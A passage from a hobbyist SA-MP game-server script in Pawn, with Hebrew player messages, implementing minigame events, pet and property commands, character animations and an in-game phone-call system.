Monster_Var[playerid] = MonsterPlayers;
MonsterSYSTEM[playerid] = CreateVehicle(444,  MonsterRandom[Monster_Var[playerid]][0], MonsterRandom[Monster_Var[playerid]][1], MonsterRandom[Monster_Var[playerid]][2],MonsterRandom[Monster_Var[playerid]][3], 1,1, 900000);
PutPlayerInVehicle(playerid,MonsterSYSTEM[playerid], 0);

LinkVehicleToInterior(MonsterSYSTEM[playerid],15);
TogglePlayerControllable(playerid, 0);
SetPlayerInterior(playerid,15);

SetPlayerVirtualWorld(playerid,0);
TogglePlayerControllable(playerid,0);
MonsterNoTeleportion[playerid] = 1;

if(MonsterPlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}

if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}



return 1;
}
//===============================MonsterWL CoMonsterNoTeleportionand===================================
if(!strcmp(cmd, "/endMonster", true)) {
if (!IsPlayerXAdmin(playerid,10)) return 0;
if(MonsterOn == 0) return SendClientMessage(playerid, red, ".אין גאטר פעיל");
GetPlayerName(playerid, Adminname, sizeof(Adminname));
MonsterCount = 0;
MonsterWL(2);
return 1; }

//=================================Spec CoMonsterNoTeleportionand=================================
if(!strcmp(cmdtext, "/xspecMonster off", true)) {
if (!IsPlayerXAdmin(playerid,10)) return 0;
if(IsPlayerInAnyVehicle(playerid))
{
RemovePlayerFromVehicle(playerid);
SetTimerEx("repairbug",5000,0,"i",playerid);
}
if(!IsPlayerInAnyVehicle(playerid))
{
SetTimerEx("repairbug",5000,0,"i",playerid);
}
return 1; }
//===============================MStart Command=================================
if(!strcmp(cmd, "/startkart", true)) {

if (!IsPlayerXAdmin(playerid,10)) return 0;

tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(KartOn == 1) return SendClientMessage(playerid, red, ".יש כבר קארטינג פעיל");
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/JoinKart~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
fnm
KartPlayers --; InKart[i] = 0; KK[i] = 0; Fuck[i] = 0;
DestroyVehicle(caridxx[i]);
}
SetTimer("KartStart",3000,0);
return 1; }
//===============================MJoin Command==================================
if(!strcmp(cmd, "/Joinkart", true))
{
if(KartOn == 0) return SendClientMessage(playerid, red, ".אין קארטינג פעיל");
if(KartPlayers == sizeof(KartRandom)) return SendClientMessage(playerid, red, ".נתספו Kart כל המקומות ב");
if(KS == 1) return SendClientMessage(playerid, red, ".הקארטינג כבר התחיל, נסה פעם הבאה ");
if(InKart[playerid] == 1) return SendClientMessage(playerid, red, "אתה כבר רשום/ה");
KartPlayers ++; InKart[playerid] = 1;
Kart_Var[playerid] = KartPlayers;
MoneyWinnerKart +=500;

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",KartPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להפיל שחקנים מהקארט");
SendClientMessage(playerid,0xE21E1EFF,string);
SetPlayerInterior(playerid,0);
SetPlayerVirtualWorld(playerid,0);
if(KartPlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}
caridxx[playerid] = CreateVehicle(571,  KartRandom[Kart_Var[playerid]][0], KartRandom[Kart_Var[playerid]][1], KartRandom[Kart_Var[playerid]][2],KartRandom[Kart_Var[playerid]][3], 1,1, 900000);
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,0);
TogglePlayerControllable(playerid, 0);
PutPlayerInVehicle(playerid,caridxx[playerid], 0);
KK[playerid] = 1;








if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
return 1;
}
//===============================MEnd Command===================================
if(!strcmp(cmd, "/Kartend", true)) {
if(KartOn == 0) return SendClientMessage(playerid, WHITE, ".אין קארטינג פעיל");
//if(KS == 1) return SendClientMessage(playerid, WHITE, ".הקארטינג כבר התחיל ");
if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, WHITE, ".אתה לא אדמין ");
SendClientMessage(playerid, red, ".הקארטינג בוטל בהצלחה ");
GetPlayerName(playerid, Adminname, sizeof(Adminname));
KS =0;
Countk = 0;
KartEnd(2);
return 1; }
//===============================KartStart Command===============================
if(!strcmp(cmd, "/stria", true))
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
if(RunSystemon==1) return SendClientMessage(playerid,WHITE,"אתה לא יכול להפעיל טריאטלון שיש כבר אחד מופעל");
StartRun();
RunSystemon =1;
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/Tria~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
SetTimer("UnFreezeTriatlon",60*1000,0);
return 1;
}


if(!strcmp(cmd, "/tria", true))
{
if(RunSystemend ==1) return SendClientMessage(playerid,WHITE,".התחרות טריאטלון התחילה");
if(RunSystemon ==0) return SendClientMessage(playerid,WHITE,".אין פעילות ריצה טריאטלון כרגע");
if(RunPlayers ==10) return SendClientMessage(playerid,WHITE,".כל המקומות נתפסו בתחרות טריאטלון נתפסו");
if(Registertrs[playerid] ==1) return SendClientMessage(playerid,WHITE,".אתה כבר רשום לתחרות טריאטלון");
TogglePlayerControllable(playerid,0);
SetPlayerRaceCheckpoint(playerid, 2,835.5297,-1883.1307,12.8672,835.5297,-1883.1307,12.8672, 4);//CP2
CPTriatlon[playerid] =1;
RunPlayers ++;

if(RunPlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",RunPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל לרוץ כמה שיותר מהר לתוך הצ'ק פוינטים האדומים");
SendClientMessage(playerid,0xE21E1EFF,string);
SetPlayerVirtualWorld(playerid,5);

Registertrs[playerid] =1;
ResetPlayerWeapons(playerid);
if(RunPlayers ==1) return SetPlayerPos(playerid,835.5286,-1825.5933,12.2180);
if(RunPlayers ==2) return SetPlayerPos(playerid,837.4442,-1826.0278,12.2011);
if(RunPlayers ==3) return SetPlayerPos(playerid,840.3302,-1826.2352,12.1772);
if(RunPlayers ==4) return SetPlayerPos(playerid,844.1083,-1826.3751,12.1367);
if(RunPlayers ==5) return SetPlayerPos(playerid,847.1127,-1826.3344,12.1633);
if(RunPlayers ==6) return SetPlayerPos(playerid,850.6811,-1825.7117,12.1968);
if(RunPlayers ==7) return SetPlayerPos(playerid,852.5970,-1826.2627,12.2117);
if(RunPlayers ==8) return SetPlayerPos(playerid,830.1938,-1826.1704,12.2715);
if(RunPlayers ==9) return SetPlayerPos(playerid,827.4509,-1826.6906,12.3083);
if(RunPlayers ==10) return SetPlayerPos(playerid,823.5757,-1826.4065,12.3643);
return 1;
}
if(!strcmp(cmd, "/sMini", true))
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/Mini~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
SetTimer("WarStartw",3000,0);
return 1;
}



if(!strcmp(cmd,"/mini", true))
{
if(WarOnw == 0) return SendClientMessage(playerid, red, ".פעילה כרגע Minigun אין פעילות");
if(WSw == 1) return SendClientMessage(playerid, red, ".ההרשמה כבר נסגרה");
if(WarPlayersw == sizeof(sssaw)) return SendClientMessage(playerid, red, ".כל המקומות נתפסו נסה פעם הבאה");
if(InWarw[playerid] == 1) return SendClientMessage(playerid, red, "Minigun הצטרפת כבר לתחרות");
GetPlayerName(playerid, playernamew, sizeof(playernamew));
WarPlayersw ++; InWarw[playerid] = 1;

GetPlayerName(playerid, playernamew, sizeof(playernamew));
MoneyWinnerMini +=500;
SetPlayerVirtualWorld(playerid,0);
if(WarPlayersw == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);
}

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",WarPlayersw);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להרוג את המשתתפים האחרים");
SendClientMessage(playerid,0xE21E1EFF,string);
if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
return 1;
}

if(!strcmp(cmd, "/Miniend", true))
{
if(WarOnw== 0) return SendClientMessage(playerid, WHITE, ".אין עכשיו מלחמה פעילה");
if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid, WHITE, ".אתה לא אדמין ");
SendClientMessage(playerid, red, "המלחמה בוטלה בהצלחה ");
GetPlayerName(playerid, Adminnamew, sizeof(Adminnamew));
Countw = 0;
WarEndw(2);
return 1;
}









if(!strcmp(cmd, "/mypet", true))
{
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,WHITE,"./help pets - שחקן/ית יקרים אין בבעלותכם חיה לעזרה עם המערכת חיות");
format(string, sizeof(string), ".~~~ :%s החיות שלך ~~~ ",GetName(playerid));
SendClientMessage(playerid, lblue, string);
if(PlayerInfo[playerid][Tor] ==1) { format(string, sizeof(string), "tor total kills: %d. ",PlayerInfo[playerid][TorKills]),SendClientMessage(playerid, lblue, string),SendClientMessage(playerid,COLOR_GREY,".צב");}
if(PlayerInfo[playerid][Shark] ==1) { format(string, sizeof(string), "shark total kills: %d.",PlayerInfo[playerid][SharkKills]),SendClientMessage(playerid, lblue, string),SendClientMessage(playerid,COLOR_GREY,".כריש");}
if(PlayerInfo[playerid][Dolp] ==1) { format(string, sizeof(string), "dolphin total kills: %d.",PlayerInfo[playerid][DolphinKills]),SendClientMessage(playerid, lblue, string),SendClientMessage(playerid,COLOR_GREY,".דולפין");}

return 1;
}

if(!strcmp(cmd, "/ppet", true))
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(20 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".המספר איידי שהזנת שגוי");
if(PlayerInfo[id][Pets] ==0) return SendClientMessage(playerid,red,".שחקן זה הינו מחזיק בחיות מחמד");
format(string, sizeof(string), "~~~ :%s`s החיות מחמד של ~~~ ",GetName(id));
SendClientMessage(playerid, lblue, string);
if(PlayerInfo[id][Tor] ==1) {
format(string, sizeof(string), "tor total kills: %d.",PlayerInfo[id][TorKills]),SendClientMessage(playerid, lblue, string);
SendClientMessage(playerid,COLOR_GREY,".צב");
}
if(PlayerInfo[id][Shark] ==1) {
format(string, sizeof(string), "shark total kills: %d.",PlayerInfo[id][SharkKills]),SendClientMessage(playerid, lblue, string);
SendClientMessage(playerid,COLOR_GREY,".כריש");
}
if(PlayerInfo[id][Dolp] ==1) {
format(string, sizeof(string), "dolphin total kills: %d.",PlayerInfo[id][DolphinKills]),SendClientMessage(playerid, lblue, string);
SendClientMessage(playerid,COLOR_GREY,".דולפין");
}
return 1;
}
if(strcmp(cmd, "/Roy", true) == 0) return SendClientMessage(playerid, red, ".רועיי ?! אתה ילד כאפות ממשש אבל ממש");
if(strcmp(cmd, "/barak", true) == 0) return SendClientMessage(playerid, red, ".!ברק ?! אתה פשוט ילד כאפות! אבל מה לעשות אנחנו אוהבים אותך");


if(strcmp(cmdtext, "/fucku", true) == 0)
{
if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
{
ApplyAnimation(playerid,"ped","fucku",4.1,1,1,1,1,1);
return 1;
}
}
 if(strcmp(cmdtext, "/bomb", true) == 0)
{
if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
{
ApplyAnimation(playerid,"ped","bomber",4.1,0,1,1,1,1);
return 1;
}
}










//-=-=-


	if(strcmp(cmd, "/buy", true)==0)
	{

		new propid = IsPlayerNearProperty(playerid);

		if(propid == -1)
		{
			SendClientMessage(playerid, red, ".אתה לא נמצא בשום נכס");
			return 1;
		}
		if(PlayerProps[playerid] == MAX_PROPERTIES_PER_PLAYER)
	    {
			format(str, 128, "%d :יש לך יותר מידי נכסים אתה לא יכול לקנות יותר, מספר הנכסים שלך", PlayerProps[playerid]);
			SendClientMessage(playerid,red, str);
			return 1;
		}
		if(PropInfo[propid][PropIsBought] == 1)
		{
			new ownerid = GetPlayerID(PropInfo[propid][PropOwner]);
			if(ownerid == playerid)
			{
			    SendClientMessage(playerid, red, ".הנכס הזה הוא שלך כבר");
			    return 1;
			}
			else
			{
			    if(PropInfo[propid][PropUnbuyableTime] > 0)
			    {
					format(str, 128, "%s - הנכס הזה נקנה על ידי", PropInfo[propid][PropOwner], PropInfo[propid][PropUnbuyableTime]);
				    SendClientMessage(playerid, COLOR_LIGHTGREEN, str);
   					format(str, 128, ".על מנת לקנות את הנכס מהשחקן %s - השחקן הזה קנה את הנכס לא מזמן אתה צריך לחכות עוד כ", PropInfo[propid][PropUnbuyableTime]);
				    SendClientMessage(playerid, COLOR_LIGHTGREEN, str);
				    return 1;
				}
			}
		}
		if(GetPlayerMoney(playerid) < PropInfo[propid][PropValue])
		{
		    format(str, 128, ".$%d :אין לך מספיק כסף לקנות נכס זה, אתה צריך כ", PropInfo[propid][PropValue]);
		    SendClientMessage(playerid, red, str);
		    return 1;
		}
		new pName[MAX_PLAYER_NAME];
		GetPlayerName(playerid, pName, sizeof(pName));
		if(PropInfo[propid][PropIsBought] && PropInfo[propid][PropUnbuyableTime] == 0)
		{
			new ownerid = GetPlayerID(PropInfo[propid][PropOwner]);
		    format(str, 128, "%s - השחקן",  pName);
			SendClientMessage(ownerid, COLOR_LIGHTGREEN, str);
		    format(str, 128, "%s - קנה ממך את הנכס שלך ה",  PropInfo[propid][PropName]);
			SendClientMessage(ownerid, COLOR_LIGHTGREEN, str);
            format(str, 128, "%d$ - קיבלת פיצוי של כ",   (PropInfo[propid][PropValue]/2));
			SendClientMessage(ownerid, COLOR_LIGHTGREEN, str);
			LACY_GiveMoney(ownerid, (PropInfo[propid][PropValue]/2));
			PlayerProps[ownerid]--;
		}
		PropInfo[propid][PropOwner] = pName;
		PropInfo[propid][PropIsBought] = 1;
		PropInfo[propid][PropUnbuyableTime] = UNBUYABLETIME;
		EarningsForPlayer[playerid] += PropInfo[propid][PropEarning];
        LACY_GiveMoney(playerid, (0-PropInfo[propid][PropValue]));
		format(str, 128, "$%d :מעכשיו תרוויח כל כמה זמן כ \"%s\" :קנית את הנכס", PropInfo[propid][PropValue], PropInfo[propid][PropName]);
        SendClientMessage(playerid, red, str);
        format(str, 128, "%s :כנס את הנכס %s השחקן",  PropInfo[propid][PropName],pName);
        SendClientMessageToAllEx(playerid, red, str);
        PlayerProps[playerid]++;
		return 1;
	}
    //================================================================================================================================
	//================================================================================================================================
	//================================================================================================================================
	if(strcmp(cmd, "/sell", true) == 0)
	{


		new propid = IsPlayerNearProperty(playerid);
		if(propid == -1)
		{
			SendClientMessage(playerid, red, ".אתה לא נמצא בשום נכס");
			return 1;
		}
		if(PropInfo[propid][PropIsBought] == 1)
		{
			new ownerid = GetPlayerID(PropInfo[propid][PropOwner]);
			if(ownerid != playerid)
			{
			    SendClientMessage(playerid, red, ".אין לך שום נכס");
			    return 1;
			}
		}
		new pName[MAX_PLAYER_NAME];
		GetPlayerName(playerid, pName, sizeof(pName));
		format(PropInfo[propid][PropOwner], MAX_PLAYER_NAME, "Nobody");
		PropInfo[propid][PropIsBought] = 0;
		PropInfo[propid][PropUnbuyableTime] = 0;
		LACY_GiveMoney(playerid, (PropInfo[propid][PropValue]/2));
		format(str, 128, "%d$ :הכסף שתקבל כל פעם מהנכס שלך הוא \"%s\" :אתה קנית את הנכס", PropInfo[propid][PropValue]/2,PropInfo[propid][PropName]);
        SendClientMessage(playerid, red, str);
        format(str, 128, "\"%s\" מחר את הנכס שלו ה %s השחקן", PropInfo[propid][PropName],pName);
        SendClientMessageToAllEx(playerid, red, str);
        PlayerProps[playerid]--;
        EarningsForPlayer[playerid] -= PropInfo[propid][PropEarning];
		return 1;
	}
    //================================================================================================================================
	//================================================================================================================================
	//================================================================================================================================

    if(strcmp(cmd, "/Props", true) == 0)
	{

	new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);

if(20 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(sid)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /Props [id]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".איידי שגוי");


	    new ownerid;
	    if(PlayerProps[id] == 0)
	    {
	        SendClientMessage(playerid, red, ".אין לשחקן זה שום נכסים");
	        return 1;
		}
		format(str, 128, "(\"Props: %d\" | \"Name: %s\" | \"ID: %d\") :רשימת הנכסים של", PlayerProps[id],GetName(id),id);
	    SendClientMessage(playerid, red, str);
		for(new propid; propid < Propertiesamount; propid++)
		{
			if(PropInfo[propid][PropIsBought] == 1)
			{
                ownerid = GetPlayerID(PropInfo[propid][PropOwner]);
				if(ownerid == id)
				{
 					format(str, 128, "Earning: %d  || Name Of Prop: \"%s\" : || Vaule: %d || Owner: %s", PropInfo[propid][PropEarning], PropInfo[propid][PropName], PropInfo[propid][PropValue],GetName(id));
 					SendClientMessage(playerid, 0xF06E8DFF, str);
				}
			}
		}
		return 1;
	}


// Wank In
if (strcmp("/wankout", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "PAULNMAC", "wank_out", 4.0, 0, 0, 0, 0, 0); // Wank Out

return 1;
}

// Arrested
if (strcmp("/arrested", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "POLICE", "crm_drgbst_01", 4.0, 0, 0, 0, 0, 0); // Arrested

return 1;
}

// Injury
if (strcmp("/injuWHITE", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "SWEET", "Sweet_injuWHITEloop", 4.0, 0, 0, 0, 0, 0); // InjuWHITE

return 1;
}

// Ass Slapped
if (strcmp("/slapped", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "SWEET", "ho_ass_slapped", 4.0, 0, 0, 0, 0, 0); // Ass Slapped

return 1;
}

// Female Smoking
if (strcmp("/fsmoking", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "SMOKING", "F_smklean_loop", 4.0, 0, 0, 0, 0, 0); // Female Smoking

return 1;
}

// Cop Look
if (strcmp("/coplook", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 0, 0, 0, 0); // Cop Looking

return 1;
}

// Lay Down
if (strcmp("/ay", cmdtext, true, 6) == 0)
{
ApplyAnimation(playerid,"BEACH", "bather", 4.0, 0, 0, 0, 0, 0); // Lay down

return 1;
}

// Take Cover
if (strcmp("/yc", cmdtext, true, 3) == 0)
{
ApplyAnimation(playerid, "ped", "cower", 3.0, 0, 0, 0, 0, 0); // Taking Cover

return 1;
}

// Vomit
if (strcmp("/vomit", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0); // Vomit BAH!

return 1;
}

// Eat Burger
if (strcmp("/eat", cmdtext, true) == 0)
{
ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0); // Eat Burger

return 1;}

// Wave
if (strcmp("/wave", cmdtext, true) == 0) {
ApplyAnimation(playerid, "KISSING", "BD_GF_Wave", 3.0, 0, 0, 0, 0, 0); // Wave

return 1;}

// Slap Ass
if (strcmp("/slapass", cmdtext, true) == 0) {
ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0); // Ass Slapping

return 1;}

// Death Crawling
if (strcmp("/death", cmdtext, true) == 0) {
ApplyAnimation(playerid, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 0, 0); // Dead Crawling

return 1;}

// Dealer
if (strcmp("/deal", cmdtext, true) == 0) {
ApplyAnimation(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0); // Deal Drugs

return 1;}

// Kiss
if (strcmp("/kiss", cmdtext, true, 5) == 0) {
ApplyAnimation(playerid, "KISSING", "Playa_Kiss_02", 3.0, 0, 0, 0, 0, 0); // Kiss

return 1;}

// Crack Dieing
if (strcmp("/crack", cmdtext, true, 6) == 0) {
ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 0, 0); // Dieing of Crack

return 1;}

// Piss
if (strcmp("/piss", cmdtext, true, 8) == 0) {
ApplyAnimation(playerid, "PAULNMAC", "Piss_in", 3.0, 0, 0, 0, 0, 0); // Pissing

return 1;}



    if (strcmp("/smoke", cmdtext, true, 4) == 0) {
    
	ApplyAnimation(playerid,"SMOKING", "M_smklean_loop", 4.0, 0, 0, 0, 0, 0);
    return 1;
    }

// Sit
if (strcmp("/sit", cmdtext, true, 4) == 0) {
ApplyAnimation(playerid,"BEACH", "ParkSit_M_loop", 4.0, 0, 0, 0, 0, 0); // Sit

return 1;}



// Strip-Tease
if (strcmp("/strip", cmdtext, true, 6) == 0){
switch (cmdtext[7]){
case 'a', 'A':{ ApplyAnimation( playerid,"STRIP", "strip_A", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
case 'b', 'B':{ ApplyAnimation( playerid,"STRIP", "strip_B", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
case 'c', 'C':{ ApplyAnimation( playerid,"STRIP", "strip_C", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
case 'd', 'D':{ ApplyAnimation( playerid,"STRIP", "strip_D", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
case 'e', 'E':{ ApplyAnimation( playerid,"STRIP", "strip_E", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
case 'f', 'F':{ ApplyAnimation( playerid,"STRIP", "strip_F", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
case 'g', 'G':{ ApplyAnimation( playerid,"STRIP", "strip_G", 4.1, 0, 1, 1, 1, 1 ); return 1; } // Strip
}SendClientMessage(playerid, COLOR_YELLOW, "אתה עכשיו עושה משהוא מגניב");

return 1;}

// Idle Chat
if(strcmp(cmd, "/chat", true) == 0){
if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT){
ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1);

//SendClientMessage(playerid, 0xFF0000FF, "אתה מדבר עכשיו"); // Chat

return 1;}}












//-----Animaped



if(strcmp(cmd, "/dance", true) == 0)
{
new atmp[256],a_dance;
atmp = strtok(cmdtext, idx);
a_dance = strval(atmp);
if(20 < strlen(atmp)) return 0;
if( !strlen(atmp) || a_dance < 1 || a_dance > 13) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /dance [1-13]");

AnimDance(playerid,a_dance);
return 1;
}

//end


if(strcmp(cmd,"/id",true) == 0 || strcmp(cmd, "/s", true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp))
{
SendClientMessage(playerid,red,"/id(/s). [nick player/or half nick] :לחיפוש כמה שמות ביחד");
format(string,256,"Your ID: %d.",playerid);
SendClientMessage(playerid,0x16EB43FF,string);
return 1;
}
format(string,sizeof(string),".\"%s\" - החיפוש נמצא",tmp);
SendClientMessage(playerid,red,string);
new found=0;
fnm
if(IsPlayerConnected(i))
{
new foundname[MAX_PLAYER_NAME];
GetPlayerName(i, foundname, MAX_PLAYER_NAME);
new namelen = strlen(foundname);
new bool:searched=false;
for(new pos=0; pos <= namelen; pos++)
{
if(searched != true)
{
if(strfind(foundname,tmp,true) == pos)
{
found++;
format(string,sizeof(string),"%d. ``%s`` (ID is: %d)",found,foundname,i);
SendClientMessage(playerid, 0x16EB43FF ,string);
searched = true;
}
}
}
}
}
return 1;
}


if(strcmp(cmd, "/call", true) == 0)
{
if(InCall[playerid] ==1) return SendClientMessage(playerid,red,"ץאנא המתן מספר שניות לחיוג חוזר");
if(IsPlayerConnected(playerid))
{
if(InCall[playerid]==1)return SendClientMessage(playerid,red,".אנא המתן דקה לצלצל שוב");
if(CellState[playerid]==ESTA_LLAMANDO)return SendClientMessage(playerid,COLOR_WHITE, ".[/H,Hangup] :אתה עדיין מחייג בשביל לנתק");
if(CellState[playerid]==LO_ESTAN_LLAMANDO)return SendClientMessage(playerid,COLOR_WHITE, ".[/Hangup]  :ובשביל לנתק [/Answer] :חייגת שיחה בשביל לענות");
	
SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if	(!strlen(tmp))
{
SendClientMessage(playerid,COLOR_WHITE, "Usage: /call [playerid]");
SetTimerEx("ColgarTelefonino",1200,0,"d",playerid);
return 1;
}
new numTel = strval(tmp);

if	(!IsPlayerConnected(numTel))
{
SendClientMessage(playerid,red, ".שחקן מנותק");
SetTimerEx("ColgarTelefonino",1200,0,"d",playerid);
return 1;

}
if(Ignore[numTel][playerid] == 1)return SendClientMessage(playerid,WHITE,"[IgnoreCall] !השחקן אליו אתה מנסה לצלצל אליו חסם אותך"),0;
if (CellState[numTel]==LIBRE)
{
CellState[numTel] = LO_ESTAN_LLAMANDO;
CellState[playerid] = ESTA_LLAMANDO;
AuxiliarTel[playerid] = numTel;
AuxiliarTel[numTel] = playerid;
TimerLLamando[playerid]=SetTimerEx("Llamando",10*1000,true,"ii",playerid,numTel);
TimerLLamando[numTel]=TimerLLamando[playerid];
format(string, sizeof(string),"..%s אתה מצלצל אל",GetName(numTel));
SendClientMessage(playerid,COLOR_LIGHTGREEN, string);

format(string, sizeof(string),"/phonehelp :מתקשר אלייך! | לעזרה %s השחקן",GetName(playerid));
SendClientMessage(numTel,lblue, string);
InCall[playerid]=1;
return 1;
}
else
{
SetTimerEx("ColgarTelefonino",1200,0,"d",playerid);
return 1;
}
}
return 1;
}


if(strcmp(cmd, "/answer", true) == 0 || strcmp(cmd, "/a", true) == 0)
{
if(IsPlayerConnected(playerid))
{
if(CellState[playerid] != LO_ESTAN_LLAMANDO) return SendClientMessage(playerid, WHITE, "..אפחד לא מתקשר אליך");
SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
SendClientMessage(playerid,COLOR_LIGHTGREEN, ".\"^\" :ענית לשיחה בהצלחה, כעת תדבר לפני כל הודעה עם ה");
SendClientMessage(AuxiliarTel[playerid],COLOR_LIGHTGREEN, ".\"^\" :השחקן ענה לשיחתך בהצלחה! על מנת לדבר איתו בצע");


CellTime[AuxiliarTel[playerid]]=0;
TimerCaidaFicha[AuxiliarTel[playerid]]=SetTimerEx("CaidaDeFicha",1000,true,"i",AuxiliarTel[playerid]);
CellState[playerid]=ESTA_HABLANDO;
CellState[AuxiliarTel[playerid]]=ESTA_HABLANDO;
return 1;
}
return 1;
}

if(strcmp(cmd, "/hangup", true) == 0 || strcmp(cmd, "/h", true) == 0)
{
if  (CellState[playerid] == LIBRE)
{
		    
return 1;
}

if  (CellState[playerid] == ESTA_LLAMANDO)
{
SendClientMessage(playerid,red,".ניתקת את הפלאפון בהצלחה");
SendClientMessage(AuxiliarTel[playerid],red,".השחקן ניתן לך את השיחה");
SetTimerEx("ColgarTelefonino",500,0,"d",playerid);
KillTimer(TimerLLamando[playerid]);
TimerLLamando[playerid]=DEAD_TIMER_ID;
TimerLLamando[AuxiliarTel[playerid]]=DEAD_TIMER_ID;
CellState[playerid]=LIBRE;
CellState[AuxiliarTel[playerid]]=LIBRE;
return 1;
}

if(CellState[playerid] == LO_ESTAN_LLAMANDO)
{
SendClientMessage(playerid,red,".השיחה נותקה");
SendClientMessage(AuxiliarTel[playerid],red,".השיחה נותקה");
SetTimerEx("ColgarTelefonino",500,0,"d",AuxiliarTel[playerid]);
KillTimer(TimerLLamando[playerid]);
TimerLLamando[playerid]=DEAD_TIMER_ID;
TimerLLamando[AuxiliarTel[playerid]]=DEAD_TIMER_ID;
CellState[playerid]=LIBRE;
CellState[AuxiliarTel[playerid]]=LIBRE;
return 1;
}

if(CellState[playerid] == ESTA_HABLANDO)
{
msgInfo(AuxiliarTel[playerid], ".השחקן התנקת מהשרת לכן השיחה סויימה");
SetTimerEx("ColgarTelefonino",500,0,"d",playerid);
SetTimerEx("ColgarTelefonino",500,0,"d",AuxiliarTel[playerid]);

if  (TimerCaidaFicha[playerid]!=DEAD_TIMER_ID)
{
KillTimer(TimerCaidaFicha[playerid]);
TimerCaidaFicha[playerid]=DEAD_TIMER_ID;
new msg[255];
format(msg,sizeof(msg),".$%d מחיר השיחה",CellTime[playerid]*PRECIO_FICHA);
LACY_GiveMoney(playerid,CellTime[playerid]*PRECIO_FICHA*-1);
SendClientMessage(playerid,WHITE,msg);
ActualizarMemoriaSalida(playerid,AuxiliarTel[playerid]);
